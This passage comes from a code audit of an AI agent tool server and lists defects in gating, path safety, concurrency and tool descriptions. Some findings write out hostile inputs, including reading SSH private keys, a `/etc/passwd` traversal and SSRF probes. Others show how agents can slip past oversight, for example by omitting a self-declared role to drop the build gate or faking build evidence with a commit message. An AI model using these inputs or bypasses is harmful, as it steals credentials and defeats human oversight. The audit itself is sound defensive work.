| G10-74 | `e2e_probe.rs:264` | HIGH | gating / SSRF | Unvalidated `probe_url` GET; 400 chars of the body returned to the model | No host restriction despite every example being localhost | Probe an internal or metadata endpoint from an ungated tool | CONFIRMED |
| G10-75 | `e2e_probe.rs:180-181,224-226` | HIGH | cross-platform | Kills `cmd.exe`, not its grandchildren | `cmd /C npm run dev` leaves `node.exe` holding the port | Fourth probe fails `EADDRINUSE`; agent concludes the app is broken | CONFIRMED |
| G10-79 | `write_interface_spec.rs:118,153-171` | HIGH | destructive | Default `mode="overwrite"` rebuilds INTERFACE.md from this call's routes only; no checkpoint, no hook, no validator | The default is the destructive branch | Backend worker adds one route; every other route vanishes; frontend worker deletes working API calls | CONFIRMED |
| G10-80 | `write_interface_spec.rs:141,146,174` | HIGH | concurrency | Unlocked read-modify-write; a failed read silently becomes an overwrite | `unwrap_or_default()` → `""` → falls into the overwrite branch | Two workers merge concurrently, one set of routes lost, both told "Wrote N route(s)" | CONFIRMED |
| G10-84 | `check_file.rs:343` + `validate.rs:734-748` | HIGH | schema | 3 of 5 `type_checker` values are inert; `"eslint"` on `.ts` is silently overridden to tsc | Match arms `("py",_)` and `("ts"\|"tsx",_)` swallow the explicit choice | Model asks for eslint on a `.ts` file, gets tsc, is never told | CONFIRMED |
| G10-92 | `path_lock.rs:58-84` + `tool_adapter.rs:181-186,259` | HIGH | concurrency | Lock key is a raw spelling; PA and MCP callers compute it from different strings | Header claims the opposite at `:40-41` | PA `write_file` and MCP `edit_file` take different mutexes for one file; lost update | CONFIRMED |
| G10-96 | `build_evidence.rs:74-120,125-136` | HIGH | evidence | `classify` is `contains` over the raw command line; exit code stored as-is | Cannot distinguish running a build from mentioning one | `git commit -m "cargo build fixes"` satisfies the `qc_review` build gate | CONFIRMED |
| G10-102 | `validate.rs` (7 spawn sites) | HIGH | resource | No timeout on any subprocess — grep for `timeout` returns 0 hits in 1086 lines | Three of the seven run under a held path lock | One hung `tsc` = permanent process-wide write outage on that path | CONFIRMED |
| G10-106 | `create_task.rs:63-64`, `annotate_file_tool.rs:74` | HIGH | schema | `required` honoured by some bodies, silently defaulted by others | No schema validator anywhere; `required` is advisory | Model sends `priority:"high"`; `"high"` is written to the board | CONFIRMED |
| G10-112 | `tool_executor.rs:327-341` + `permission.rs:12-18` | HIGH | gating | The gate reads `PermissionMode`, never `AgentMode` | `mod.rs:167` defers safety to a layer that has no mode input | `Review` mode in `Autonomous` writes files and runs `bash` unprompted | CONFIRMED |
| T12 | `read_file.rs` | HIGH | path-safety | No path jail on a read-only, auto-approved tool | — | `read_file("C:/Users/<u>/.ssh/id_rsa")` succeeds | CONFIRMED (G2a) |
| T13 | `grep.rs`, `glob.rs`, `list_directory.rs` | HIGH | path-safety | No path jail on three auto-approved tools | — | `list_directory("C:/Users")` enumerates the machine | CONFIRMED (G2a) |
| T18 | `bash.rs:134-141` | HIGH | memory-safety | `unwrap_or(tail_start)` fallback is a raw byte index | Panics on a multi-byte char when 50 KB of output has no newline | Progress bar or minified dump to stdout panics the task | CONFIRMED (G2a) |
| T32/G-1 | `mod.rs:6-72` | HIGH | dead-code | `graph_tools.rs` (25 KB) and `graph_prompts.rs` have no `mod` declaration | 5 graph tools never compiled; `server.rs:149` calls the omission intentional | `graph_query` etc. unreachable by every consumer | CONFIRMED (G2a) |
| T50 | `update_task_status_tool.rs:133` + `tool_adapter.rs:180-182` | HIGH | gating | Build gate runs only `if ctx.agent_role.is_some()`; role is caller-declared | The guarded party decides whether the guard applies | Omit `__agent_role` → the build gate disappears entirely | CONFIRMED (G2a) |

### MEDIUM

| ID | file:line | Sev | Class | What it does | Why it is wrong | Concrete failure scenario | Status |
|---|---|---|---|---|---|---|---|
| G10-02 | `server.rs:126-149` | MEDIUM | description | Worker-surface doc comment lists 19 tools and names `validate` as an excluded tool | 9 tools omitted; `validate` has no `Tool` impl | Anyone reading it mis-scopes the worker surface | CONFIRMED |
| G10-03 | `autodev_mcp_config.yaml:29-56` | MEDIUM | registration | Declares 25 tools; the server serves 34 | Missing set includes `list_worker_requests` and all three ACP tools | Orchestrator-side allowlisting silently disables escalation + ACP | CONFIRMED |
| G10-04 | `…/core-orchestrator/…:16` vs `resources/sidecars/…:16` | MEDIUM | registration | Shipped config uses `id: mcp-autodev`; every agent card requires `autodev-mcp-server` | The two copies differ on exactly that line | Packaged build: every worker fails its required-server precondition | drift CONFIRMED / runtime SUSPECTED |
| G10-06 | `mod.rs:176` | MEDIUM | registration | `FastDevelopment \| Review` is one match arm | Review can `write_file`, `bash`, `e2e_probe` | Review-mode session mutates the repo | CONFIRMED |
| G10-11 | `write_file.rs:115` | MEDIUM | error-handling | `auto_checkpoint_before_write` returns `()`; failure invisible | Overwrite proceeds regardless | Checkpoint fails, overwrite lands, no undo, no notice | CONFIRMED |
| G10-13 | `edit_file.rs:222-229` | MEDIUM | error-handling | Reports "✓ Edited" when `new_string == old_string` | Nothing changed | Agent believes its fix landed | CONFIRMED |
| G10-17 | `check_file.rs` | MEDIUM | path-safety | No path jail | Runs a type checker against any absolute path | — | CONFIRMED |
| G10-21 | `grep.rs`, `glob.rs` | MEDIUM | resource | Unbounded `WalkDir` with no timeout | Native tool, so `bash`'s 120 s cap does not apply | `grep(pattern="zzz", path="C:/")` walks the drive | CONFIRMED |
| G10-26 | `bash.rs:283-300` | MEDIUM | usability | Redirect scanner jails `>`/`>>`/`tee` targets | `/dev/null` and `> NUL` resolve outside the workspace | `cmd 2>/dev/null` refused; model retries the same command | CONFIRMED |
| G10-27 | `bash.rs:131-143` | MEDIUM | resource | 50 KB cap applied to the *combined* buffer after concatenation | 60 KB of stderr discards the STDOUT header and all program output | Agent cannot tell which stream was cut | CONFIRMED |
| G10-29 | `create_task.rs:63-64` | MEDIUM | schema | `priority`/`task_type` required in schema, defaulted in body, never enum-checked | — | `priority:"high"` written to the board; kanban sees an out-of-enum value | CONFIRMED |
| G10-31 | `list_tasks_tool.rs` | MEDIUM | resource | No `limit`, no pagination | Every other list tool has a cap | Mature board returns hundreds of KB per supervisor tick | CONFIRMED |
| G10-34 | `db/tasks.rs:554-565` | MEDIUM | destructive | Every status update writes `rejection_reason = ?` | `update_task_status(id,"in_progress")` NULLs it | QC feedback erased by the worker acting on it | CONFIRMED |
| G10-35 | `update_task_status_tool.rs:176` | MEDIUM | schema | `status` passed to SQL unvalidated | Schema enum is model-side only | `status:"Done"` → task vanishes from every board view | CONFIRMED |
| G10-40 | `set_task_budget_tool.rs` | MEDIUM | error-handling | Stores `None`, reports `100000/$0.50/20` | Description, schema and body give three different answers | Supervisor told the task is capped when nothing was written | CONFIRMED |
| G10-42 | `mod.rs:96-164` | MEDIUM | registration | `create_epic`/`create_phased_task` not exposed to workers; the read tools are | Mode 2 Supervisor can read epic progress but not create an epic | Ruflo Feature 5 decomposition unreachable from the fleet | CONFIRMED |
| G10-44 | `request_supervisor_action.rs:98-107` | MEDIUM | correctness | Identity prefers `task.assigned_worker` over the caller | Conflates task owner with speaker | `worker-frontend` escalates; request recorded as `worker-backend`; Supervisor replies to the wrong agent | CONFIRMED |
| G10-48 | `tool_adapter.rs:180-182` | MEDIUM | gating | Fleet identity is `__agent_role`, self-asserted, no auth middleware | It is a claim, not a credential | Any caller sets `agent_role:"supervisor"` → broadcast, read others' inboxes, bypass the build gate | CONFIRMED |
| G10-51 | `spawn_subagent.rs:87-89` | MEDIUM | correctness | `(Some(task_ctx), _)` arm drops a supplied `system_prompt` | Silent | Custom prompt discarded, generic 3-liner used, no notice | CONFIRMED |
| G10-52 | `spawn_subagent.rs:125` + `tool_adapter.rs:204-219` | MEDIUM | gating | `parent_slug = ctx.session_id`; synthetic uuid per call | `MAX_PER_PARENT` (10) never reached | Fan-out cap unenforceable over MCP | CONFIRMED |
| G10-58 | `analyze_diff_tool.rs:219-222` | MEDIUM | correctness | Provider/model from env vars, hardcoded Anthropic fallback | Ignores the app's configured provider | User picks Ollama; every `analyze_diff` still bills Anthropic, or hard-errors on a missing key | CONFIRMED |
| G10-63 | `annotate_file_tool.rs:91` | MEDIUM | correctness | `task_id: None` hardcoded despite the field existing | Annotations cannot be correlated with the review | Rejected task's findings can't be listed, cleared, or aged out | CONFIRMED |
| G10-64 | `annotate_file_tool.rs:74` | MEDIUM | schema | `severity` read with `unwrap_or("info")`, no enum check | — | `"BLOCKING"` written to the DB; renderer has no matching case | CONFIRMED |
| G10-68 | `spawn_qc_review.rs:401` | MEDIUM | cost | Pops the first entry costing exactly $0.10 | A realised $0.10 review is indistinguishable from a provisional | Real spend deleted from the ring; guard under-counts thereafter | CONFIRMED |
| G10-69 | `spawn_qc_review.rs:157` | MEDIUM | gating | QC reviewer spawned `tools: Vec::new()` → full MCP surface (via G10-50) | Reviewer independence unenforced | A QC reviewer rewrites the code it is reviewing, then passes it | CONFIRMED |
| G10-70 | `spawn_qc_review.rs:337,354,358,92-94` | MEDIUM | description | Ceiling documented as configurable, is a `const`; guard described as "lock-free", is a `Mutex` | — | Operator cannot raise the ceiling when it trips | CONFIRMED |
| G10-76 | `e2e_probe.rs:129,147-151,224-226` | MEDIUM | error-handling | Timeout drops the future; the explicit teardown lives inside it | Message says "Children were killed" | Orphans survive on the path that most needs teardown | CONFIRMED |
| G10-77 | `e2e_probe.rs:34,36,112-117` | MEDIUM | schema | No relational check between `boot_wait_s`, `timeout_s` and the 10 s HTTP timeout | A plausible call can never succeed | `boot_wait_s=30` with default `timeout_s=30` always times out and blames the app | CONFIRMED |
| G10-81 | `write_interface_spec.rs:190` | MEDIUM | schema | `method`/`path` unvalidated free text | Prose enumerates 7 verbs; nothing checks | `### GET ALL events` becomes the authoritative contract | CONFIRMED |
| G10-82 | `write_interface_spec.rs:147-150` | MEDIUM | resource | `merge` never dedupes; no size cap | Read in full by tier 2.6 on every JS/TS write | INTERFACE.md grows unbounded; cost paid on every frontend write | CONFIRMED |
| G10-85 | `write_file.rs:150-192` vs `edit_file.rs:215` | MEDIUM | description | 4 validators vs 1 on the same file, undocumented | Agent reads `edit_file`'s silence as clean | Import/export/contract drift invisible to every edit | CONFIRMED |
| G10-87 | `path_jail.rs:49-81` | MEDIUM | path-safety | `..` in the non-existent tail is dropped (`file_name()` → `None`), not refused | Path silently rewritten, not rejected | Linux: `write_file("newdir/../../../etc/passwd")` lands at `<ws>/newdir/etc/passwd`, reported as success | CONFIRMED |
| G10-88 | `path_jail.rs:89-96` | MEDIUM | path-safety | Strips `\\?\` from `\\?\UNC\…`, yielding a relative `UNC\…` | Correct strip is `\\?\UNC\` → `\\` | UNC workspace: every write lands in a junk `UNC\` tree under the process CWD, reported as success | CONFIRMED |
| G10-89 | `read_file.rs:196-199` | MEDIUM | cross-platform | `C:foo` is not `is_absolute()`, and `join` with a prefix-no-root path replaces self | `working_dir` silently discarded | Unjailed tools resolve `C:foo` against the process CWD (`src-tauri/`) | CONFIRMED |
| G10-93 | `tool_adapter.rs:40-46,253-270` | MEDIUM | dead-code | Adapter path lock requires non-read-only + top-level `"path"` + not in the exempt trio | **No registered tool satisfies all three** | The Bug-B block never executes; the two tools that need it use other arg names | CONFIRMED |
| G10-94 | `path_lock.rs:95` | MEDIUM | error-handling | `registry().lock().unwrap()` | One panic under the lock poisons it permanently | Every subsequent `write_file`/`edit_file`/`append_file` in the process panics | CONFIRMED |
| G10-97 | `build_evidence.rs:89-91,106-108` | MEDIUM | evidence | `npm install`, `npm ci`, `uv sync`, `pip install -r` classified as builds | Installing deps proves nothing compiled | A passing `npm install` re-establishes build evidence after a failing build | CONFIRMED |
| G10-98 | `build_evidence.rs:39` vs `:88-93` | MEDIUM | description | Enum doc lists `npm run dev` as Node; it is only in the smoke branch | Bare `npm run dev` classifies as `None` | Reader of the enum is wrong about what counts | CONFIRMED |
| G10-99 | `build_evidence.rs:141-150` | MEDIUM | evidence | Exit code stored and returned unfiltered; the veto lives only in one caller | A second consumer would silently accept failed builds | — | SUSPECTED |
| G10-103 | `validate.rs:919-932,789,661` | MEDIUM | path-safety | `find_upward` stops on raw path equality with `working_dir` | `start` is often canonical while `working_dir` is the raw config string | Walks to `C:\`, picks up a foreign `tsconfig.json` / `INTERFACE.md` | CONFIRMED |
| G10-104 | `validate.rs:906-913` | MEDIUM | dead-code | Loop returns on the first non-absolute candidate | Entries after the bare name are unreachable | Documented "priority order" is not what runs | CONFIRMED |
| G10-107 | `planner.rs:24-40,44` | MEDIUM | schema | Whole interface is one free-form `yaml_dsl` string; `_ctx` unused | No schema guidance; discovery round-trip required; plans not session- or workspace-scoped | One of only 4 Delegate tools, and the model must guess or spend a turn | CONFIRMED |
| G10-108 | `tool_adapter.rs:100-107` | MEDIUM | error-handling | `wrap_result` drops `ToolResult.hint` | 7 tools set it; only `engine.rs:316` reads it | Workers — smallest context budgets — lose every large-result guidance hint | CONFIRMED |
| G10-109 | 3 sites vs 2 sites | MEDIUM | memory-safety | 3 caps slice raw byte offsets, 2 slice by char | The fix already exists at `validate.rs:846-853` | See T18, G10-54, G10-61 | CONFIRMED |
| G10-110 | `list_tasks`, `list_worker_requests`, `list_worker_messages`, `analyze_diff` | MEDIUM | resource | The four uncapped tools are the four whose cardinality grows with project age | Called every supervisor tick | Supervisor tick cost grows without bound as the board fills | CONFIRMED |
| G10-113 | `bash.rs:79-87,114` | MEDIUM | evidence | Evidence records the Windows-**rewritten** command, not the requested one | The shadowed `command` binding is passed to `record` | Stored proof-of-build is not what the agent asked to run | CONFIRMED |
| T15 | `edit_file.rs` | MEDIUM | correctness | `replace_all=true` + `old_string=""` inserts `new_string` between every character | — | File destroyed, reported as a successful edit | CONFIRMED (G2a) |
| T16/T17 | `bash.rs:427-429` | MEDIUM | cross-platform | `" \| grep "` replaced before `" \| grep -i "`, making the `-i` arm unreachable | Pipes rewritten to PowerShell then run under `cmd /C` | Case-insensitive pipe greps silently mis-rewritten | CONFIRMED (G2a) |
| T19 | `bash.rs` | MEDIUM | cross-platform | Windows rewrite layer generally | — | — | CONFIRMED (G2a) |
| T36 | `append_file.rs` | MEDIUM | destructive | No checkpoint, no `PostFileWrite` hook | The one write tool whose changes cannot be undone | Append invisible to graph, telemetry and rollback | CONFIRMED (G2a) |
| T40 | `set_task_budget_tool.rs` | MEDIUM | gating | Stored budget applies only if the runner calls `with_task_budget()` | — | Budget set, never enforced | CONFIRMED (G2a) |
| T48 | `tool_executor.rs:84,247,311` | MEDIUM | gating | `ctx.depth` hardcoded 0 natively; `__depth` self-declared over MCP | Guarded party decides whether the guard applies | Unbounded subagent nesting until the pool hard-caps | CONFIRMED (G2a) |
| T49 | `send_worker_message.rs`, `list_worker_messages.rs` | MEDIUM | gating | Refuse when `agent_role` is `None` — always, natively | `mod.rs:230-231` registers them in PA for manual inspection | All 3 ACP tools are dead weight in PA; 3 schemas of pure token cost | CONFIRMED (G2a) |
| T53 | `validate.rs` | MEDIUM | resource | No subprocess timeout | Superseded in scope by G10-102 (it is total, not partial) | — | CONFIRMED (G2a) |
| T54 | `validate.rs:269` | MEDIUM | cross-platform | `Command::new("tsc")` cannot resolve npm's `tsc.cmd` shim on Windows | Combined with G10-16 → silent false green | Every `.ts` file reads clean on a machine where TS *is* installed | CONFIRMED (G2a) |
| T56 | `list_worker_messages.rs` | MEDIUM | correctness | Read side effect marks `pending → read` | — | Messages consumed by a listing call | CONFIRMED (G2a) |
| T57 | — | MEDIUM | — | G2a-owned | — | — | CONFIRMED (G2a) |

### LOW

| ID | file:line | Sev | Class | What it does | Why it is wrong | Concrete failure scenario | Status |
|---|---|---|---|---|---|---|---|
| G10-08 | `read_file.rs:116` | LOW | resource | Whole file buffered before the line slice | A 2 GB file is fully read for a 10-line request | Memory spike on a large fixture | CONFIRMED |
| G10-12 | `write_file.rs` | LOW | cross-platform | No newline normalisation | Agent's `\n` mixes with CRLF files | Diff noise on Windows | CONFIRMED |
| G10-14 | `append_file.rs` | LOW | evidence | No lint pass at all | The documented way to break `package.json` silently | — | CONFIRMED |
| G10-18 | `list_directory.rs:123` | LOW | cross-platform | Renders `src\foo.rs`; `grep`/`glob` normalise to `/` | Two path dialects in one session | Model constructs a path that fails | CONFIRMED |
| G10-19 | `list_directory.rs:84-87` vs `grep`/`glob` | LOW | correctness | Two different hardcoded skip lists; neither reads `.gitignore` | — | Inconsistent visibility between tools | CONFIRMED |
| G10-22 | `grep.rs:177` | LOW | cross-platform | `.replace('\\', "/")` on the relative path | Corrupts legitimate backslashes in Linux filenames | — | CONFIRMED |
| G10-23 | `glob.rs:138-139` | LOW | correctness | Bare filename fallback makes `*.rs` behave as `**/*.rs` | Top-level-only listing is inexpressible | — | CONFIRMED |
| G10-28 | `bash.rs` | LOW | schema | `timeout_secs` unvalidated | `86400` accepted | A model can pin a worker for a day | CONFIRMED |
| G10-30 | `create_task.rs:59` | LOW | cross-platform | `title.len() > 120` counts bytes | 40-char CJK title rejected as ">120 characters" | — | CONFIRMED |
| G10-32 | `list_tasks_tool.rs` | LOW | schema | `status` unvalidated; unknown → 0 rows | Indistinguishable from an empty board | Model concludes the board is empty | CONFIRMED |
| G10-36 | `assign_task.rs` | LOW | description | Worker list hardcoded in prose as well as generated in the enum | A sixth worker updates the enum, leaves the prose lying | — | CONFIRMED |
| G10-37 | `assign_tasks_batch.rs` | LOW | resource | No cap on `assignments.len()` | 5000 sequential round-trips in one untimed call | — | CONFIRMED |
| G10-39 | `claim_task_tool.rs` | LOW | correctness | `claim_host` from the app's hostname | Multi-machine guard reasons about the wrong host | — | CONFIRMED |
| G10-43 | `create_epic_tool.rs` | LOW | description | Claims auto-complete on subtask completion | Nothing in the tool establishes it | — | CONFIRMED |
| G10-45 | `request_supervisor_action.rs` | LOW | schema | `payload` free-form object; 5 shapes documented, none validated | Malformed payload discovered only by the Supervisor's LLM | — | CONFIRMED |
| G10-46 | `list_worker_requests_tool.rs` | LOW | resource | No limit; `status` unvalidated | Full payloads, unbounded | 20 `decompose_audit` payloads blow the tick | CONFIRMED |
| G10-49 | `list_worker_messages.rs` | LOW | resource | No inbox cap | `unread_only=false` returns the whole history at 4 KB each | — | CONFIRMED |
| G10-53 | `spawn_parallel_subagents.rs` | LOW | schema | `max_concurrent` only `.max(1)` | `10` defeats the windowing entirely | Relies solely on pool hard caps | CONFIRMED |
| G10-55 | `remember_this.rs` | LOW | description | "Stored facts appear in every future system prompt" | True only when a `session_id` was attached (`context.rs:115-119`) | Model told its write is durable and always visible | CONFIRMED |
| G10-59 | `analyze_diff_tool.rs:178` | LOW | correctness | Diff-marker regex matches markers inside diff *content* | `+++ b/x` in an added line matches | Drift computed from untouched files | CONFIRMED |
| G10-60 | `analyze_diff_tool.rs:192-196` | LOW | correctness | Consumer heuristic fires on any path containing "use" | `UserQueryPage.tsx` classified as an API consumer | False `consumer_only` drift | CONFIRMED |
| G10-65 | `annotate_file_tool.rs:77-81` | LOW | correctness | `source` from `ctx.agent_role`, `None` natively | Every PA annotation recorded as `source:"user"` | User appears to have written the agent's notes | CONFIRMED |
| G10-66 | `annotate_file_tool.rs` | LOW | schema | No `note` length bound; no line-range bound | "max 500 chars recommended" unenforced | `1..2000000` accepted and rendered | CONFIRMED |
| G10-71 | `spawn_qc_review.rs:148-151` | LOW | schema | `as_u64()` then `as u32` | `4294967296` → `0` → normalised to default | Explicit timeout silently discarded | CONFIRMED |
| G10-72 | `spawn_qc_review.rs:204` | LOW | correctness | Detached task is the only claim release | App exit strands `under_review_by` | Task never reviewable again without a reconciler | CONFIRMED |
| G10-78 | `e2e_probe.rs:178-211` | LOW | resource | No cap on `start_cmds.len()` | — | Spawn arbitrarily many shells per call | CONFIRMED |
| G10-83 | `write_interface_spec.rs:98` | LOW | gating | `requires_permission()=false` on a destructive-by-default tool | Inert (§3.4), but the intent was to skip the prompt | — | CONFIRMED |
| G10-90 | `path_jail.rs` → callers | LOW | path-safety | Check/use race; no `O_NOFOLLOW` | Header calls it a "load-bearing safety net" | Component swapped for a symlink between check and write | CONFIRMED |
| G10-91 | `path_jail.rs:27,145` | LOW | error-handling | Config failure and escape attempt return the same error shape | Model's self-correction can never succeed | Renamed workspace presents as "outside the workspace" | CONFIRMED |
| G10-95 | `path_lock.rs:26-30` | LOW | resource | Entries never GC'd, keyed by spelling not by file | Bound is per distinct string, not per file | Workspace change mid-session re-keys every lock and drops exclusion across the change | CONFIRMED |
| G10-100 | `build_evidence.rs:153-162` | LOW | dead-code | `most_recent_smoke` has zero callers | The whole `Smoke` kind only ever *removes* evidence | Smoke-classified builds vanish from the gate | CONFIRMED |
| G10-101 | `build_evidence.rs:145` | LOW | resource | Empty `Vec`s and their keys never removed | Combined with synthetic session ids | One permanent map entry per build-shaped bash call | CONFIRMED |
| G10-105 | `validate.rs:4-5,267` | LOW | description | Tier 1 documented as "lightweight subprocess"; spawns full `tsc` | ~1–3 s startup on every `.ts` write, under the lock | — | CONFIRMED |
| T11 | `list_directory.rs:61,98,108-141` | LOW | resource | `max_entries` checked only on entry; `truncated` is exact equality | 20 000 files emitted with `truncated:false` | Blows context and denies truncating | CONFIRMED (G2a) |
| T33 | `glob.rs` | LOW | description | "Automatically respects .gitignore" — never opened | Only a 7-entry skip list | Agent "fixes" generated artefacts under `coverage/`, `.venv/` | CONFIRMED (G2a) |

---

## 5. Tool description defects

The `description()` string is the **only** guidance the LLM receives about a tool.
`ToolRegistry::to_definitions` (`tool_registry.rs:31-39`) copies `name`,
`description` and `input_schema` into the provider request and nothing else — no
examples, no usage notes, no mode annotations. Combined with §3.1 (schemas are
advisory, never enforced), the description is the whole contract. A wrong
description does not crash anything; it manifests as **the agent doing the wrong
thing confidently**, which is harder to diagnose than a panic.

**Result: 33 of the 38 tool descriptions carry at least one defect. 5 are clean.**

Defect classes used below:
- **FALSE** — states something that is not true of the code.
- **UNKEEPABLE** — promises runtime behaviour the tool cannot guarantee.
- **OMITS-CONSTRAINT** — leaves out a rule that will refuse or silently alter the call.
- **OMITS-COST** — leaves out a material cost, side effect, or danger.
- **CONTRADICTS** — disagrees with its own schema or its own body.
- **UNENFORCED** — states a restriction nothing in the code checks.

### 5.1 The 33 defective descriptions

| # | Tool / module | Class | The text | What is actually true | Likely misuse | Finding |
|---|---|---|---|---|---|---|
| 1 | `grep` / `grep.rs` | **FALSE** | "Skips binary files" | No binary detection exists; `read_to_string` fails on non-UTF-8 and the file is `continue`d (`:191-194`) | Agent trusts that a UTF-16 text file was searched; it was skipped as "binary" | §2.1 |
| 2 | `glob` / `glob.rs` | **FALSE** | "Automatically respects .gitignore" | `.gitignore` is never opened; only a 7-entry `skip_dirs` array (`:115`) | Agent "fixes" generated artefacts under `coverage/`, `.venv/`, `out/`, `__pycache__/` | T33 |
| 3 | `claim_task` / `claim_task_tool.rs` | **FALSE** | "records this process's PID … enables automatic recovery if the worker process exits unexpectedly" | Records the *Tauri app's* PID; the reconciler then skips the 4-hour TTL because that PID is alive | Agent uses `claim_task` believing it improves recovery; it disables it | G10-38 |
| 4 | `spawn_subagent` / `spawn_subagent.rs` | **FALSE** | "should run with a restricted tool subset"; `tools` = "Tool subset (e.g. ["read_file","grep"])" | `SubagentConfig.tools` is read nowhere; every subagent gets all 34 MCP tools | Parent spawns an "analysis-only" child that writes to the repo | G10-50 |
| 5 | `check_file` / `check_file.rs` | **FALSE**, **OMITS-COST** | "Run lint / syntax / import checks on a file **without executing it**"; syntax tier listed as "py_compile / node --check" | True of the target file, false of the workspace: `.js` + `checks:["types"]` executes `eslint.config.js`; `.py` executes `<workspace>/.venv/…/python.exe`; `.ts` spawns full `tsc` | Agent treats it as a safe read; it is the cheapest RCE in the tree | G10-15, G10-86, G10-105 |
| 6 | `e2e_probe` / `e2e_probe.rs` | **OMITS-COST** | "End-to-end smoke probe… the cheapest way to catch boot-time failures" | Executes N raw shell one-liners with no jail, no redirect check, no output capture; GETs any URL; declares `requires_permission()=false` | Reads as a scoped test; is a second, ungated `bash` | G10-73, G10-74 |
| 7 | `analyze_diff` / `analyze_diff_tool.rs` | **OMITS-COST** | "Analyze a git diff between two branches and get a structured risk score" | Makes a **billed third-party LLM call** and accepts an **unjailed absolute `repo_path`**, uploading that repo's full patch | Agent calls it freely on any path; user is billed and data leaves the machine | G10-56, G10-57, G10-58 |
| 8 | `bash` / `bash.rs` | **CONTRADICTS**, **OMITS-CONSTRAINT** | Windows: "The shell is Windows CMD… Use PowerShell-compatible alternatives"; non-Windows string mentions no timeout, no output cap, no redirect rule | Instructs the model to write PowerShell for a `cmd` shell; `> /dev/null` is refused; output is silently tail-truncated at 50 KB | Model writes PowerShell idioms into `cmd`, retries refused redirects forever | §2.2, G10-26 |
| 9 | `set_task_budget` / `set_task_budget_tool.rs` | **CONTRADICTS** | "Omit a field to leave it unlimited" | Schema says "Default: 100,000 / $0.50 / 20"; body stores `None` and *reports* those numbers | Three different answers to "what happens if I omit `max_usd`?" | G10-40 |
| 10 | `spawn_parallel_subagents` / `spawn_parallel_subagents.rs` | **CONTRADICTS** | "Spawn **2**-10 subagents" | Schema is `minItems: 1` and the body accepts 1 (`:75-78`) | Model avoids a legitimate single-subtask call | §2.4 |
| 11 | `list_worker_messages` / `list_worker_messages.rs` | **CONTRADICTS** | "Returns **every** message addressed to you, oldest first. By default only unread messages are returned." | The two sentences disagree; the default is `unread_only=true` | Model expects full history from a default call | §2.4 |
| 12 | `create_task` / `create_task.rs` | **UNKEEPABLE** | "will be picked up by the Supervisor **within 2 minutes**" | Nothing checks that the recipe is enabled, the scheduler is running, or the sidecar is up; `kick` is fire-and-forget. The success `message` (`:110`) repeats it into the transcript as fact | In Delegate mode with the fleet stopped, the user is told work is dispatched that will never start | §2.3 |
| 13 | `create_epic` / `create_epic_tool.rs` | **UNKEEPABLE** | "The epic auto-completes when all its subtasks reach status=done" | A claim about machinery outside this tool; nothing in `create_epic_tool.rs` establishes it | Agent never checks; epic silently stays open | G10-43 |
| 14 | `remember_this` / `remember_this.rs` | **UNKEEPABLE** | "Stored facts appear in **every** future system prompt" | Facts reach the prompt only via `build_memory_context`, which `context.rs:115-119` calls **only when a `session_id` was attached** | Agent stops repeating context it believes is durable | G10-55 |
| 15 | `request_supervisor_action` / `request_supervisor_action.rs` | **UNKEEPABLE** | "The Supervisor polls these requests every tick and acts on them" | True only if the supervisor recipe is scheduled; the tool does not check | Escalation filed into a queue nobody drains | §2.4 |
| 16 | `acknowledge_worker_message` / `acknowledge_worker_message.rs` | **UNKEEPABLE** | "The Supervisor uses unacknowledged messages older than a few minutes as a 'stuck conversation' signal" | A claim about supervisor-side machinery; nothing in this tool establishes it | Agent relies on an escalation path that may not exist | SUSPECTED |
| 17 | `list_worker_requests` / `list_worker_requests_tool.rs` | **UNKEEPABLE**, **OMITS-CONSTRAINT** | "Supervisor calls this every tick (Step 1a) to drain pending requests" | The tool is **not declared** in `autodev_mcp_config.yaml` (G10-03); no `limit`, and `status` is unvalidated so an unknown value returns 0 rows | Allowlisted orchestrator silently loses the escalation queue; empty result read as an empty queue | G10-03, G10-46 |
| 18 | `resolve_worker_request` / `resolve_worker_request_tool.rs` | **OMITS-CONSTRAINT** | "**ALWAYS** call this after handling a request — otherwise the request stays pending and the Supervisor re-processes it every tick" | The tool returns success even when it resolved nothing (affected rows discarded) | The description makes the false success maximally damaging: the model is told this is critical, gets a success, and moves on while the request stays pending forever | G10-47 |
| 19 | `update_task_status` / `update_task_status_tool.rs` | **OMITS-CONSTRAINT** | Lists 9 statuses; says nothing about the gate | `qc_review` is refused without build evidence in this session; `build_failed` is the required destination on failure | Model learns the rule only by triggering it, mid-task | T50, G10-33 |
| 20 | `write_file` / `write_file.rs` | **OMITS-COST** | Documents refuse-on-exists, `overwrite`, parent-dir creation | Also runs **four** validators inline (can spawn `tsc`, taking seconds) and takes a checkpoint | Agent has no idea a `.ts` write spawns a compiler under a process-wide lock | G10-10, G10-85 |
| 21 | `edit_file` / `edit_file.rs` | **OMITS-CONSTRAINT** | Exact match, multi-match failure, `replace_all` all stated — otherwise good | Does **not** say `old_string` must be non-empty, and the schema has no `minLength` | `old_string:""` → infinite loop and OOM | T14, T15 |
| 22 | `append_file` / `append_file.rs` | **OMITS-CONSTRAINT** | Adequate on mechanics | Omits that **no checkpoint is taken** — the one write tool whose changes cannot be undone — and that no lint runs | Agent picks `append_file` for a "safe" edit; it is the least recoverable | T36, G10-14 |
| 23 | `list_directory` / `list_directory.rs` | **OMITS-CONSTRAINT** | One sentence | Omits the depth limit (3/1), the 500-entry default, the skip list, and that `path` is optional; promises `size_bytes` unconditionally while `:132-134` sets it only for files | Model cannot reason about what it did or did not see | T11, §2.1 |
| 24 | `list_tasks` / `list_tasks_tool.rs` | **OMITS-CONSTRAINT** | Explains `compact` "to avoid token bloat" | There is **no `limit` and no pagination**, and it does not say so | Supervisor pulls the entire board every tick | G10-31 |
| 25 | `get_task` / `get_task_tool.rs` | **OMITS-CONSTRAINT** | "Returns the full task record including `rejection_reason` (set by QC when status=rejected)" | True at read time, but the worker's own next `update_task_status` call **NULLs `rejection_reason`** (`db/tasks.rs:554-565`) | Worker reads the rejection, moves to `in_progress`, erases it, and cannot re-read the feedback it was acting on | G10-34 |
| 26 | `send_worker_message` / `send_worker_message.rs` | **OMITS-CONSTRAINT** | Good, with clear "NOT for" guidance | Does not say the tool is **unusable without `__agent_role`**, i.e. always fails in PA mode | 3 of 38 PA tool schemas that can never succeed | T49 |
| 27 | `create_phased_task` / `create_phased_task_tool.rs` | **OMITS-CONSTRAINT** | Describes the two-step flow | `epic_id` must be a **string**; `create_epic` hands back a number, and the error text does not mention the type | The documented workflow fails on the first attempt | G10-41 |
